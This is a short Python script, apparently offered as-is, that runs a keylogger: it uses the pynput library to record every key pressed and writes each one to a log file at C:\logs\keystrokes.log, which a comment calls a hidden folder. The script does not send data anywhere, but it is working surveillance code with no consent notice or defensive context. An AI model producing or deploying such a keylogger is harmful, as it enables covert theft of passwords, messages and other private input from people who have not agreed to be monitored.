import os
import sys
import logging
import threading
from pynput import keyboard

# Create the hidden folder and set the log file path
log_folder_path = 'C:\\logs\\'
log_file_path = os.path.join(log_folder_path, 'keystrokes.log')

# Ensure the folder exists; create if not
os.makedirs(log_folder_path, exist_ok=True)

# Set up logging
logging.basicConfig(filename=log_file_path, level=logging.DEBUG)

# Define the function to log keystrokes
def on_press(key):
    try:
        logging.info('Key {0} pressed.'.format(key.char))
    except AttributeError:
        logging.info('Key {0} pressed.'.format(key))

# Start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
